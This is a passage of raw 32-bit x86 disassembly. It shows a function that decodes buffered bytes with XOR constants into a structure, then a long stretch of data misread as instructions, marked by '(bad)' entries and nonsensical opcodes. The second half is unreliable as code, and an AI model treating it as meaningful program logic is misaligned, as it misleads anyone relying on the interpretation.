  43d481:	mov    DWORD PTR [eax+0x10],edx
  43d484:	mov    edx,DWORD PTR ds:0x448108
  43d48a:	movzx  ecx,BYTE PTR [edx+0xf]
  43d48e:	movzx  edi,BYTE PTR [edx+0xd]
  43d492:	shl    ecx,0x8
  43d495:	add    ecx,edi
  43d497:	movzx  edx,WORD PTR [edx+0xb]
  43d49b:	shl    ecx,0x10
  43d49e:	add    ecx,edx
  43d4a0:	mov    edx,DWORD PTR ds:0x448d1c
  43d4a6:	sub    edx,0x401e6
  43d4ac:	neg    edx
  43d4ae:	sbb    edx,edx
  43d4b0:	and    edx,0x4a38e2e1
  43d4b6:	add    edx,0xb5c817c0
  43d4bc:	xor    edx,ecx
  43d4be:	mov    DWORD PTR ds:0x448d10,ecx
  43d4c4:	mov    DWORD PTR [eax+0x14],edx
  43d4c7:	mov    edx,DWORD PTR ds:0x448108
  43d4cd:	add    edx,0x10
  43d4d0:	mov    DWORD PTR ds:0x448108,edx
  43d4d6:	movzx  ecx,WORD PTR [edx+0x6]
  43d4da:	movzx  edi,BYTE PTR [edx+0x3]
  43d4de:	movzx  edx,BYTE PTR [edx]
  43d4e1:	shl    ecx,0x8
  43d4e4:	add    ecx,edi
  43d4e6:	shl    ecx,0x8
  43d4e9:	add    ecx,edx
  43d4eb:	mov    DWORD PTR ds:0x448d10,ecx
  43d4f1:	mov    edx,0xb5cc19a6
  43d4f6:	sub    edx,DWORD PTR ds:0x448d1c
  43d4fc:	xor    edx,ecx
  43d4fe:	mov    DWORD PTR [eax+0x18],edx
  43d501:	mov    edx,DWORD PTR ds:0x448108
  43d507:	movzx  ecx,BYTE PTR [edx+0xf]
  43d50b:	movzx  edi,BYTE PTR [edx+0xd]
  43d50f:	movzx  edx,WORD PTR [edx+0xb]
  43d513:	shl    ecx,0x8
  43d516:	add    ecx,edi
  43d518:	shl    ecx,0x10
  43d51b:	add    ecx,edx
  43d51d:	mov    edx,DWORD PTR ds:0x448d1c
  43d523:	sub    edx,0x401e6
  43d529:	neg    edx
  43d52b:	sbb    edx,edx
  43d52d:	and    edx,0x4a38e2e1
  43d533:	add    edx,0xb5c817c0
  43d539:	xor    edx,ecx
  43d53b:	mov    DWORD PTR ds:0x448d10,ecx
  43d541:	mov    DWORD PTR [eax+0x1c],edx
  43d544:	mov    edx,DWORD PTR ds:0x448108
  43d54a:	add    edx,0x10
  43d54d:	mov    DWORD PTR ds:0x448108,edx
  43d553:	movzx  ecx,WORD PTR [edx+0x6]
  43d557:	movzx  edi,BYTE PTR [edx+0x3]
  43d55b:	movzx  edx,BYTE PTR [edx]
  43d55e:	shl    ecx,0x8
  43d561:	add    ecx,edi
  43d563:	shl    ecx,0x8
  43d566:	add    ecx,edx
  43d568:	mov    DWORD PTR ds:0x448d10,ecx
  43d56e:	mov    edx,0xb5cc19a6
  43d573:	sub    edx,DWORD PTR ds:0x448d1c
  43d579:	xor    edx,ecx
  43d57b:	mov    DWORD PTR [eax+0x20],edx
  43d57e:	mov    edx,DWORD PTR ds:0x448108
  43d584:	movzx  ecx,BYTE PTR [edx+0xf]
  43d588:	movzx  edi,BYTE PTR [edx+0xd]
  43d58c:	movzx  edx,WORD PTR [edx+0xb]
  43d590:	shl    ecx,0x8
  43d593:	add    ecx,edi
  43d595:	shl    ecx,0x10
  43d598:	add    ecx,edx
  43d59a:	mov    edx,DWORD PTR ds:0x448d1c
  43d5a0:	sub    edx,0x401e6
  43d5a6:	neg    edx
  43d5a8:	sbb    edx,edx
  43d5aa:	and    edx,0x4a38e2e1
  43d5b0:	add    edx,0xb5c817c0
  43d5b6:	xor    edx,ecx
  43d5b8:	mov    DWORD PTR ds:0x448d10,ecx
  43d5be:	mov    DWORD PTR [eax+0x24],edx
  43d5c1:	mov    edx,DWORD PTR ds:0x448108
  43d5c7:	add    edx,0x10
  43d5ca:	mov    DWORD PTR ds:0x448108,edx
  43d5d0:	movzx  ecx,WORD PTR [edx+0x6]
  43d5d4:	shl    ecx,0x8
  43d5d7:	movzx  edi,BYTE PTR [edx+0x3]
  43d5db:	movzx  edx,BYTE PTR [edx]
  43d5de:	add    ecx,edi
  43d5e0:	shl    ecx,0x8
  43d5e3:	add    ecx,edx
  43d5e5:	mov    DWORD PTR ds:0x448d10,ecx
  43d5eb:	mov    edx,0xb5cc19a6
  43d5f0:	sub    edx,DWORD PTR ds:0x448d1c
  43d5f6:	xor    edx,ecx
  43d5f8:	mov    DWORD PTR [eax+0x28],edx
  43d5fb:	mov    edx,DWORD PTR ds:0x448108
  43d601:	movzx  ecx,BYTE PTR [edx+0xf]
  43d605:	movzx  edi,BYTE PTR [edx+0xd]
  43d609:	movzx  edx,WORD PTR [edx+0xb]
  43d60d:	shl    ecx,0x8
  43d610:	add    ecx,edi
  43d612:	shl    ecx,0x10
  43d615:	add    ecx,edx
  43d617:	mov    edx,DWORD PTR ds:0x448d1c
  43d61d:	sub    edx,0x401e6
  43d623:	neg    edx
  43d625:	sbb    edx,edx
  43d627:	and    edx,0x4a38e2e1
  43d62d:	add    edx,0xb5c817c0
  43d633:	xor    edx,ecx
  43d635:	mov    DWORD PTR ds:0x448d10,ecx
  43d63b:	mov    DWORD PTR [eax+0x2c],edx
  43d63e:	mov    edx,DWORD PTR ds:0x448108
  43d644:	add    edx,0x10
  43d647:	add    eax,0x30
  43d64a:	dec    esi
  43d64b:	mov    DWORD PTR ds:0x448108,edx
  43d651:	jne    0x43d360
  43d657:	movzx  ecx,WORD PTR [edx+0x6]
  43d65b:	movzx  esi,BYTE PTR [edx+0x3]
  43d65f:	movzx  edx,BYTE PTR [edx]
  43d662:	shl    ecx,0x8
  43d665:	add    ecx,esi
  43d667:	shl    ecx,0x8
  43d66a:	add    ecx,edx
  43d66c:	mov    edx,DWORD PTR ds:0x448d1c
  43d672:	add    edx,0xb5c415da
  43d678:	xor    edx,ecx
  43d67a:	mov    DWORD PTR ds:0x448d10,ecx
  43d680:	push   0x70
  43d682:	mov    DWORD PTR [eax],edx
  43d684:	call   DWORD PTR ds:0x448d20
  43d68a:	add    esp,0x4
  43d68d:	pop    edi
  43d68e:	pop    esi
  43d68f:	pop    ebp
  43d690:	pop    ebx
  43d691:	add    esp,0x15c
  43d697:	ret    
  43d698:	int3   
  43d699:	int3   
  43d69a:	int3   
  43d69b:	int3   
  43d69c:	int3   
  43d69d:	int3   
  43d69e:	int3   
  43d69f:	int3   
  43d6a0:	(bad)  
  43d6a1:	cmp    al,BYTE PTR [eax]
  43d6a3:	and    eax,0x83fe000a
  43d6a8:	inc    ebp
  43d6aa:	add    al,ch
  43d6ac:	xchg   edi,eax
  43d6ad:	add    dl,ah
  43d6af:	(bad)  
  43d6b0:	dec    DWORD PTR [eax+0x0]
  43d6b3:	adc    eax,0xcc60002a
  43d6b8:	push   DWORD PTR [ebp-0xdbd27d]
  43d6be:	add    al,0xff
  43d6c0:	add    BYTE PTR [ebp-0x7c8ff700],dl
  43d6c6:	push   0xffffffff
  43d6c8:	call   DWORD PTR [edx-0xc3b37d]
  43d6ce:	add    BYTE PTR fs:[eax],al
  43d6d1:	and    eax,DWORD PTR [ebx-0x6c005d93]
  43d6d7:	add    bh,bh
  43d6d9:	notrack jmp esi
  43d6dc:	sub    edi,edi
  43d6de:	pop    ecx
  43d6df:	inc    DWORD PTR [eax]
  43d6e1:	sub    al,0x0
  43d6e3:	adc    BYTE PTR [ecx+0x0],al
  43d6e6:	ja     0x43d6e8
  43d6e8:	call   esi
  43d6ea:	int3   
  43d6eb:	cmp    bh,BYTE PTR [esi-0x77]
  43d6ee:	(bad)  
  43d6ef:	inc    DWORD PTR [eax]
  43d6f1:	sti    
  43d6f2:	jmp    DWORD PTR [ebp-0x48]
  43d6f5:	add    BYTE PTR [ebp+0x0],ah
  43d6f8:	add    al,bl
  43d6fa:	(bad)  
  43d6fb:	fdiv   QWORD PTR [ebx]
  43d6fd:	add    bl,ah
  43d6ff:	add    BYTE PTR [eax],al
  43d701:	xchg   ebp,eax
  43d702:	inc    DWORD PTR [edx-0x7cafff4a]
  43d708:	add    BYTE PTR [ecx],al
  43d70a:	add    BYTE PTR [eax+0xa783d6],dl
  43d710:	mov    eax,eax
  43d712:	add    BYTE PTR [ebp-0x7e],dh
  43d715:	call   FWORD PTR [ebp+0x31ffff]
  43d71b:	pop    esp
  43d71c:	out    dx,eax
  43d71d:	add    ch,dl
  43d71f:	inc    DWORD PTR [eax]
  43d721:	and    eax,0x3e7dff
  43d726:	popf   
  43d727:	add    bh,bh
  43d729:	fisttp WORD PTR [ecx+0x7000bf23]
  43d72f:	inc    DWORD PTR [ebx+0x76b2fff3]
  43d735:	call   ebp
  43d737:	inc    DWORD PTR [eax]
  43d739:	call   WORD PTR [edx+0xafff52]
  43d740:	int3   
  43d741:	xchg   esp,eax
  43d742:	adc    DWORD PTR [esi-0x45],0x0
  43d746:	outs   dx,BYTE PTR ds:[esi]
  43d747:	int3   
  43d748:	jmp    DWORD PTR [edi]
  43d74a:	dec    DWORD PTR [ecx+0x1e]
  43d74d:	dec    DWORD PTR [ebx]
  43d74f:	(bad)  
  43d750:	dec    esp
  43d752:	inc    DWORD PTR [edi-0x29]
  43d755:	add    bh,ch
  43d757:	add    BYTE PTR [eax],al
  43d759:	push   0xffc21483
  43d75e:	mov    eax,0xff9e00ff
  43d763:	scas   eax,DWORD PTR es:[edi]
  43d764:	mov    esp,0xff009e89
  43d769:	aas    
  43d76a:	add    BYTE PTR [edx-0x56],bl
  43d76d:	add    BYTE PTR [ecx-0x1],dl
  43d770:	sbb    DWORD PTR [eax+0x9aa000],0xffffffd1
  43d777:	mov    DWORD PTR [eax],eax
  43d779:	sub    eax,0x302400
  43d77e:	add    BYTE PTR es:[eax],al
  43d781:	cmp    al,0xff
  43d783:	call   0x6eff:0x3e00d6
  43d78a:	add    BYTE PTR [edx+0x4c],ch
  43d78d:	mov    eax,edi
  43d78f:	int3   
  43d790:	add    BYTE PTR [esi-0x1],bl
  43d793:	ins    BYTE PTR es:[edi],dx
  43d794:	fwait
  43d795:	(bad)  
  43d796:	fadd   DWORD PTR [eax]
  43d798:	dec    DWORD PTR [edi-0x1]
  43d79b:	adc    al,al
  43d79d:	add    dh,ch
  43d79f:	add    bh,bh
  43d7a1:	data16 add BYTE PTR [edi-0x7c0276b9],ch
  43d7a8:	dec    DWORD PTR [ebx-0x1]
  43d7ab:	cmp    edi,ebx
  43d7ad:	call   FWORD PTR [ecx]
  43d7af:	inc    DWORD PTR [ebx-0x2f1c006e]
  43d7b5:	jmp    DWORD PTR [ebx]
  43d7b7:	dec    esp
  43d7b9:	cmp    BYTE PTR [ebx-0x3f000588],al
  43d7bf:	int3   
  43d7c0:	jmp    FWORD PTR [edi-0x77]
  43d7c3:	pop    esp
  43d7c4:	push   edi
  43d7c5:	add    BYTE PTR [eax+eax*1-0xc7c0f01],cl
  43d7cc:	inc    edi
  43d7cd:	push   esp
  43d7cf:	add    ah,cl
  43d7d1:	mov    edi,0x8935b289
  43d7d6:	dec    eax
  43d7d7:	(bad)  
  43d7d8:	jmp    DWORD PTR [ebx-0x33a57f01]
  43d7de:	sub    bh,bh
  43d7e0:	cmp    DWORD PTR [ebp+0xdfbf00],0x43
  43d7e7:	inc    DWORD PTR [eax]
  43d7e9:	mov    ebp,0xff5995ff
  43d7ee:	call   0xffe5d7f2
  43d7f3:	sub    ebp,DWORD PTR [edi+edi*8+0x3400ffeb]
  43d7fa:	push   DWORD PTR [edi]
  43d7fc:	sar    bh,0xb9
  43d7ff:	(bad)  
  43d800:	(bad)  
  43d801:	stc    
  43d802:	int3   
  43d803:	xor    al,0x2
  43d805:	adc    DWORD PTR [edx-0x1],0xffffff83
  43d809:	jmp    0x110dd0e
  43d80e:	push   ebx
  43d80f:	add    bh,bh
  43d811:	nop
  43d812:	push   DWORD PTR [edx]
  43d814:	test   al,0x0
  43d816:	mov    bh,bh
  43d818:	add    ah,dl
  43d81a:	add    BYTE PTR [ecx+ecx*8],cl
  43d81d:	inc    DWORD PTR [eax+eax*1]
  43d820:	and    DWORD PTR [ecx-0xa3777],0x23
  43d827:	(bad)  
  43d828:	push   DWORD PTR [edx+0x78a9ff]
  43d82e:	scas   al,BYTE PTR es:[edi]
  43d82f:	dec    DWORD PTR [ecx-0x18a17c92]
  43d835:	add    bh,al
  43d837:	inc    DWORD PTR [ebx-0x5ba90009]
  43d83d:	call   FWORD PTR [ecx-0x1]
  43d840:	add    ch,dh
  43d842:	call   FWORD PTR [ecx-0x8fff0e]
  43d848:	add    bl,bl
  43d84a:	add    ah,al
  43d84c:	pop    esp
  43d84d:	call   DWORD PTR [eax+0x0]
  43d850:	add    BYTE PTR [ecx-0x77],dh
  43d853:	mov    ds,WORD PTR [ecx]
  43d855:	jmp    DWORD PTR [ebx+0x683ff]
  43d85b:	push   esp
  43d85c:	cmp    eax,0xff9e89
  43d861:	out    dx,al
  43d862:	call   DWORD PTR [esp+edi*2+0xffae89]
  43d869:	xchg   esp,eax
  43d86a:	inc    DWORD PTR [ecx+0x11]
  43d86d:	dec    eax
  43d86f:	mov    DWORD PTR [ecx-0x66aa00fd],ecx
  43d875:	mov    DWORD PTR [ebx+eax*4],ebp
  43d878:	cmp    DWORD PTR [ebx+0x0],0xffffffca
  43d87c:	ror    DWORD PTR [ecx-0x27c0072],cl
  43d882:	add    cl,ah
  43d884:	test   al,0x0
  43d886:	mov    edi,?
  43d888:	call   FWORD PTR [ebp-0x1]
  43d88b:	mov    bh,0xa9
  43d88d:	add    BYTE PTR [esi+0x0],al
  43d890:	int3   
  43d891:	and    al,0x83
  43d893:	xor    eax,DWORD PTR [edi+0xffe400]
  43d899:	cmp    eax,0xff5226ff
  43d89e:	jne    0x43d823
  43d8a0:	mov    DWORD PTR [eax+0x3cfbff],ebx
  43d8a6:	mov    al,0x83
  43d8a8:	call   DWORD PTR [edi+0x0]
  43d8ab:	repz out dx,eax
  43d8ad:	dec    DWORD PTR [eax-0x1]
  43d8b0:	xor    DWORD PTR [ebx],0x0
  43d8b3:	mov    ah,0x44
  43d8b5:	cmp    DWORD PTR [edx+0x0],0xffffffff
  43d8b9:	and    DWORD PTR ds:[edx+0x7e],0xffffffff
  43d8be:	hlt    
  43d8bf:	add    BYTE PTR [ebx+0x1e408315],al
  43d8c5:	add    BYTE PTR [esi-0x34],bh
  43d8c8:	inc    esp
  43d8ca:	call   DWORD PTR [ecx-0x39]
  43d8cd:	add    BYTE PTR [eax+0xa8ccff],bl
  43d8d3:	fwait
  43d8d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d8d5:	add    BYTE PTR [edi+0x0],dh
  43d8d8:	inc    DWORD PTR [edx-0x7d]
  43d8db:	push   cs
  43d8dc:	mov    WORD PTR [eax],es
  43d8de:	out    dx,eax
  43d8df:	mov    DWORD PTR [ecx-0x2ff900d2],ecx
  43d8e5:	add    BYTE PTR [ebx+eax*4],bl
  43d8e8:	add    BYTE PTR [esp+ecx*8],bl
  43d8eb:	mov    al,0x5d
  43d8ed:	add    bl,al
  43d8ef:	cmp    edi,0xffffffb7
  43d8f2:	add    BYTE PTR [ebx],ah
  43d8f4:	xchg   edx,eax
  43d8f5:	(bad)  
  43d8f6:	mov    edx,0xff3bffff
  43d8fb:	sub    ebx,ebp
  43d8fd:	xor    DWORD PTR [edi+0x23ffff],0xf
  43d904:	xor    ecx,DWORD PTR [ecx-0x65ff0025]
  43d90a:	int3   
  43d90b:	imul   ecx,DWORD PTR [esp+ecx*8+0x3c],0xcc2200ff
  43d913:	cmp    BYTE PTR [ebx-0x1],cl
  43d916:	out    0xff,al
  43d918:	mov    DWORD PTR ds:0xff9ac0ff,edx
  43d91e:	add    bh,bh
  43d920:	int3   
  43d921:	repnz or DWORD PTR [ecx-0x7618ff60],0xffffffff
  43d929:	adc    eax,DWORD PTR [eax]
  43d92b:	and    DWORD PTR [edi+edi*8-0x9ffff80],edi
  43d932:	call   DWORD PTR ds:0x8922895a
  43d938:	add    BYTE PTR [ebx],bh
  43d93a:	jmp    DWORD PTR [edi-0x40]
  43d93d:	mov    DWORD PTR [esi-0x7d],esp
  43d940:	add    BYTE PTR [ebp-0x89401],bl
  43d946:	dec    edx
  43d947:	add    ah,cl
  43d949:	push   eax
  43d94a:	(bad)  
  43d94b:	out    dx,al
  43d94c:	inc    WORD PTR [ecx-0x7d]
  43d950:	call   FWORD PTR [esi-0x65c700]
  43d956:	push   0x895b0089
  43d95b:	and    ch,BYTE PTR [ebp+0x89b9ff]
  43d961:	push   es
  43d962:	cmp    ebp,0xffffffc0
  43d965:	(bad)  
  43d966:	mov    ebp,0x66ffff
  43d96b:	loope  0x43d983
  43d96d:	mov    eax,esi
  43d96f:	add    BYTE PTR [ebx+0x18f1ccb5],al
  43d975:	int3   
  43d976:	ret    0xff00
  43d979:	xor    bh,bh
  43d97b:	das    
  43d97c:	in     al,dx
  43d97d:	push   DWORD PTR [edi-0x1]
  43d980:	call   DWORD PTR ds:0xff3e91ff
  43d986:	daa    
  43d987:	add    BYTE PTR [eax],al
  43d989:	sub    edi,edi
  43d98b:	mov    ecx,0x9d835d
  43d990:	cmp    DWORD PTR [ecx-0x66d500],0x10
  43d997:	inc    DWORD PTR [eax]
  43d999:	loope  0x43d99b
  43d99b:	jle    0x43d91d
  43d99d:	jmp    DWORD PTR [edx]
  43d99f:	add    bh,bh
  43d9a1:	sub    BYTE PTR [eax],al
  43d9a3:	push   cs
  43d9a4:	hlt    
  43d9a5:	(bad)  
  43d9a6:	mov    ebp,0xdcccff
  43d9ab:	mov    edi,0x9700f9
  43d9b0:	push   DWORD PTR [ebp+0x7533ff]
  43d9b6:	sub    cl,BYTE PTR [ecx+0x23ff6e00]
  43d9bc:	xlat   BYTE PTR ds:[ebx]
  43d9bd:	and    esi,0x0
  43d9c0:	push   DWORD PTR [ebx+eax*4-0x28]
  43d9c4:	aad    0xff
  43d9c6:	mov    al,0xff
  43d9c8:	add    DWORD PTR [eax],0xffffff83
  43d9cb:	push   0xff9d892a
  43d9d0:	add    BYTE PTR [ecx+0x0],dl
  43d9d3:	cmp    al,0x68
  43d9d5:	call   DWORD PTR [ebx+eax*4-0x7f00f101]
  43d9dc:	xor    DWORD PTR [ecx-0x64ff7c64],ecx
  43d9e2:	add    BYTE PTR [ebx+0xb8322],dh
  43d9e8:	add    BYTE PTR [ebx],bl
  43d9ea:	jmp    FWORD PTR [ecx]
  43d9ec:	pop    esp
  43d9ed:	or     DWORD PTR [ebp-0x1],0x0
  43d9f1:	das    
  43d9f2:	add    cl,cl
  43d9f4:	push   cs
  43d9f5:	int3   
  43d9f6:	das    
  43d9f7:	add    BYTE PTR [eax],al
  43d9f9:	out    0xff,al
  43d9fb:	es stc 
  43d9fd:	dec    DWORD PTR [ecx-0x1]
  43da00:	push   DWORD PTR [ebx+0x0]
  43da03:	cmp    DWORD PTR [edi-0x1],esi
  43da06:	icebp  
  43da07:	inc    DWORD PTR [eax]
  43da09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43da0a:	sbb    DWORD PTR [eax],0xffffffdf
  43da0d:	or     DWORD PTR [edx],0x0
  43da10:	add    BYTE PTR [eax+eax*1-0x80],cl
  43da14:	test   BYTE PTR [ecx+0x15ff0042],cl
  43da1a:	add    BYTE PTR [eax+0x57],dh
  43da1d:	jmp    FWORD PTR [eax+eax*1]
  43da20:	add    dh,dh
  43da22:	(bad)  
  43da23:	in     al,dx
  43da24:	ins    BYTE PTR es:[edi],dx
  43da25:	add    BYTE PTR [ebx+eax*4-0x1],bl
  43da29:	mov    dh,0x89
  43da2b:	fwait
  43da2c:	add    DWORD PTR [eax],eax
  43da2e:	dec    edx
  43da2f:	add    ah,cl
  43da31:	sti    
  43da32:	(bad)  
  43da33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43da35:	(bad)  
  43da36:	cmp    eax,0x38383
  43da3b:	shl    DWORD PTR [ebp-0x76004f01],1
  43da41:	fiadd  DWORD PTR [eax]
  43da43:	bswap  edi
  43da45:	xor    esi,0x0
  43da48:	int3   
  43da49:	ins    BYTE PTR es:[edi],dx
  43da4a:	(bad)  
  43da4b:	mov    ecx,0xffc5896b
  43da50:	inc    DWORD PTR [eax-0x77c700]
  43da56:	icebp  
  43da57:	inc    DWORD PTR [eax]
  43da59:	inc    esi
  43da5a:	call   esi
  43da5c:	add    bh,bh
  43da5e:	sar    edi,cl
  43da60:	add    ch,al
  43da62:	mov    esi,eax
  43da64:	xchg   BYTE PTR [ecx+0x1dffff78],cl
  43da6a:	add    BYTE PTR [ebx+0x5d83ef],dl
  43da70:	call   FWORD PTR [esi-0x1]
  43da73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43da74:	pop    edx
  43da75:	call   FWORD PTR [eax]
  43da77:	add    BYTE PTR [eax],al
  43da79:	mov    eax,ds:0x83d7e000
  43da7e:	jbe    0x43da80
  43da80:	jmp    DWORD PTR [ecx-0x49f77]
  43da86:	sbb    ecx,esp
  43da88:	(bad)  
  43da89:	in     eax,dx
  43da8a:	call   FWORD PTR [eax+0x5e00a0]
  43da90:	dec    DWORD PTR [edx-0x7d]
  43da93:	out    0x7,eax
  43da95:	inc    DWORD PTR [eax-0x7d]
  43da98:	jmp    ebx
  43da9a:	push   DWORD PTR [ecx-0x33df00d3]
  43daa0:	add    BYTE PTR [eax-0x33387e77],ch
  43daa6:	mov    edi,0xff7bff00
  43daab:	jl     0x43db1b
  43daad:	add    bl,al
  43daaf:	add    bh,bh
  43dab1:	add    al,BYTE PTR [ebx+0xc16e]
  43dab7:	add    bh,bh
  43dab9:	pop    eax
  43daba:	add    al,cl
  43dabc:	test   al,0xff
  43dabe:	jo     0x43dabf
  43dac0:	(bad)  
  43dac1:	cmp    DWORD PTR [ecx+0x4ffbc0a],ecx
  43dac7:	add    BYTE PTR [ecx+0x455f0068],cl
  43dacd:	call   FWORD PTR [ebx-0x33110001]
  43dad3:	outs   dx,DWORD PTR ds:[esi]
  43dad4:	sar    edi,0x76
  43dad7:	cmp    edi,0x5b
  43dada:	dec    DWORD PTR [esp+edi*4-0x3300087d]
  43dae1:	ror    esp,1
  43dae3:	stc    
  43dae4:	call   0xe1:0xffcc6b00
  43daeb:	loop   0x43db2a
  43daed:	int3   
  43daee:	addr16 add bh,bh
  43daf1:	dec    ebp
  43daf2:	add    dh,ch
  43daf4:	scas   al,BYTE PTR es:[edi]
  43daf5:	jmp    FWORD PTR [eax+0x0]
  43daf8:	or     edx,0xffffffff
  43dafb:	cmp    eax,0x41ccb6
  43db00:	add    BYTE PTR [edx],bh
  43db02:	add    BYTE PTR [esi],ah
  43db04:	adc    al,0xff
  43db06:	rol    BYTE PTR [ebx+0x1effff00],1
  43db0c:	jae    0x43db0d
  43db0e:	je     0x43db10
  43db10:	jmp    DWORD PTR [edi-0x1]
  43db13:	mov    dl,0xbe
  43db15:	add    BYTE PTR [eax],ch
  43db17:	(bad)  
  43db18:	(bad)  
  43db19:	mov    eax,0xffd18acc
  43db1e:	test   al,0xff
  43db20:	dec    edi
  43db22:	mov    DWORD PTR [ebx+0x57],esp
  43db25:	add    BYTE PTR [eax-0x7c40007d],dl
  43db2b:	xor    ah,ch
  43db2d:	jmp    DWORD PTR [esi+0xc5ffff]
  43db33:	xor    DWORD PTR [edx],ebx
  43db35:	add    BYTE PTR [ecx-0x1],bl
  43db38:	jmp    FWORD PTR [edi+edi*8+0x2d]
  43db3c:	pop    ss
  43db3d:	add    BYTE PTR [edx],dh
  43db3f:	dec    DWORD PTR [ecx-0xcc33344]
  43db45:	call   FWORD PTR [ecx-0x1]
  43db48:	mov    DWORD PTR [edi-0x1],ecx
  43db4b:	js     0x43daf0
  43db4d:	push   ebp
  43db4f:	(bad)  
  43db50:	jmp    DWORD PTR [ecx-0x198c00]
  43db56:	add    BYTE PTR [eax],al
  43db58:	int3   
  43db59:	sti    
  43db5a:	add    BYTE PTR [esi+0x42],cl
  43db5d:	add    BYTE PTR [ebp+0x0],ch
  43db60:	push   ecx
  43db62:	cmp    DWORD PTR [ebx],0xffffff98
  43db65:	add    BYTE PTR [ebx+eax*4-0x77],dl
  43db69:	adc    BYTE PTR [eax],al
  43db6b:	dec    ecx
  43db6c:	and    bh,bh
  43db6e:	mov    esp,0xfffaff00
  43db73:	mov    dl,0xd4
  43db75:	add    BYTE PTR [edx],bh
  43db77:	(bad)  
  43db78:	push   DWORD PTR [ebx-0x1]
  43db7b:	xchg   ebp,eax
  43db7c:	push   0xffcc9e83
  43db81:	cmp    bh,bh
  43db83:	es fdiv st(7),st
  43db86:	retf   
  43db87:	(bad)  
  43db88:	jmp    FWORD PTR [edi-0x410577]
  43db8e:	push   esi
  43db8f:	(bad)  
  43db90:	(bad)  
  43db91:	jg     0x43db92
  43db93:	jo     0x43db1b
  43db95:	(bad)  
  43db96:	cmp    edi,edi
  43db98:	int3   
  43db99:	sbb    ecx,esp
  43db9b:	pop    ds
  43db9c:	or     al,0xff
  43db9e:	cmp    edi,edi
  43dba0:	add    BYTE PTR [ecx+0xa54aff],ch
  43dba6:	out    0x0,eax
  43dba8:	add    al,cl
  43dbaa:	add    BYTE PTR [ecx-0xf],bh
  43dbad:	xor    DWORD PTR [ebp-0x7ca37700],0x5f
  43dbb4:	stc    
  43dbb5:	push   DWORD PTR ds:0xff21ff00
  43dbbb:	pop    esi
  43dbbc:	pop    ebp
  43dbbd:	int3   
  43dbbe:	xor    BYTE PTR [eax],al
  43dbc0:	adc    DWORD PTR [eax-0xd0ae00],0x33
  43dbc7:	add    DWORD PTR [eax],0xffffffd5
  43dbca:	(bad)  
  43dbcb:	cmp    al,0xa5
  43dbcd:	mov    DWORD PTR [edi+edi*8],ebp
  43dbd0:	dec    DWORD PTR [ebp-0x33d0b501]
  43dbd6:	pop    ebx
  43dbd7:	inc    DWORD PTR [eax]
  43dbd9:	xchg   edx,eax
  43dbda:	int3   
  43dbdb:	iret   
  43dbdc:	or     ah,cl
  43dbde:	cli    
  43dbdf:	add    bh,bh
  43dbe1:	sub    al,0x0
  43dbe3:	cmp    esi,esp
  43dbe5:	add    BYTE PTR [ecx-0xa67601],dl
  43dbeb:	push   cs
  43dbec:	in     al,dx
  43dbed:	(bad)  
  43dbee:	js     0x43db79
  43dbf0:	call   DWORD PTR [eax]
  43dbf2:	adc    DWORD PTR [ecx-0x72],0x0
  43dbf6:	ins    BYTE PTR es:[edi],dx
  43dbf7:	(bad)  
  43dbf8:	call   FWORD PTR [edi+edi*8-0x4]
  43dbfc:	push   0xffffff83
  43dbfe:	out    0xff,eax
  43dc00:	call   FWORD PTR [eax-0x7d]
  43dc03:	and    DWORD PTR [edx-0x267d],eax
  43dc09:	loop   0x43dc0a
  43dc0b:	add    edi,DWORD PTR [eax+eax*1-0x8007c48]
  43dc12:	mov    DWORD PTR [edi-0x6c],esi
  43dc15:	int3   
  43dc16:	or     BYTE PTR [ecx+0x1aff8cff],0x3e
  43dc1d:	add    BYTE PTR [ebx+0x0],ch
  43dc20:	int3   
  43dc21:	mov    eax,ds:0xffb3bd89
  43dc26:	mov    bh,0xff
  43dc28:	add    dh,dh
  43dc2a:	mov    DWORD PTR [eax-0x33ec3386],ebx
  43dc30:	add    BYTE PTR [esi+0x0],cl
  43dc33:	and    eax,0x8966cc9d
  43dc38:	(bad)  
  43dc39:	jmp    0xff9f:0xff5d1e00
  43dc40:	int3   
  43dc41:	mov    ah,0xcc
  43dc43:	iret   
  43dc44:	ins    DWORD PTR es:[edi],dx
  43dc45:	add    cl,ch
  43dc47:	inc    DWORD PTR [eax]
  43dc49:	out    dx,al
  43dc4a:	dec    DWORD PTR [esi]
  43dc4c:	jns    0x43dc4e
  43dc4e:	and    al,0xff
  43dc50:	int3   
  43dc51:	or     edi,edi
  43dc53:	xor    BYTE PTR [edi+edi*8+0x1d],al
  43dc57:	(bad)  
  43dc58:	call   DWORD PTR [ebx-0x7c45c37d]
  43dc5e:	mov    al,ds:0xffd9ff00
  43dc63:	call   0x98dd52
  43dc68:	call   DWORD PTR [ebx-0x34]
  43dc6b:	inc    edi
  43dc6c:	les    eax,FWORD PTR [eax]
  43dc6e:	arpl   di,di
  43dc70:	add    BYTE PTR [edx-0x76db7f00],bh
  43dc76:	mov    cl,ah
  43dc78:	add    BYTE PTR [edi+edi*8-0x6b],ch
  43dc7c:	pop    ebx
  43dc7d:	call   edx
  43dc7f:	int3   
  43dc80:	call   DWORD PTR [edx-0x1]
  43dc83:	adc    ah,BYTE PTR [ecx+0xaaff]
  43dc89:	inc    edx
  43dc8a:	call   DWORD PTR [eax]
  43dc8c:	mov    dh,0x83
  43dc8e:	int    0xff
  43dc90:	(bad)  
  43dc91:	std    
  43dc92:	add    ah,ch
  43dc94:	sbb    eax,0xccff90ff
  43dc99:	cmp    edi,0x57ff8d53
  43dc9f:	inc    DWORD PTR [eax]
  43dca1:	cmp    eax,0x832120ff
  43dca6:	mov    dl,0xff
  43dca8:	add    BYTE PTR [edx+0x0],dl
  43dcab:	jle    0x43dc51
  43dcad:	call   DWORD PTR [esi-0x41ff77]
  43dcb3:	lahf   
  43dcb4:	mov    bl,0xff
  43dcb6:	xor    edi,edi
  43dcb8:	dec    DWORD PTR [edi]
  43dcba:	dec    DWORD PTR [ecx-0x5b00f8]
  43dcc0:	jmp    DWORD PTR [ebx-0xc96f01]
  43dcc6:	aaa    
  43dcc7:	(bad)  
  43dcc8:	jmp    esi
  43dcca:	call   FWORD PTR ds:0x83c289a9
  43dcd0:	add    BYTE PTR [eax+0x0],cl
  43dcd3:	cmp    DWORD PTR [eax],edi
  43dcd5:	(bad)  
  43dcd6:	stc    
  43dcd7:	add    BYTE PTR [eax],al
  43dcd9:	inc    eax
